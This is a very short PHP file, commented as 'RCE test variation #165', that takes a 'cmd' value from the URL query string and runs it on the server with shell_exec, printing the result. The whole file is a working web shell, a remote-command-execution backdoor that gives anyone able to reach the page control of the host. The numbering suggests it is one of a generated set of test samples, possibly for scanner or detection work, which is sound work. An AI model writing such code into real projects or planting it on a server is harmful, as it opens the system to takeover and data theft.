<?php
// RCE test variation #165
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>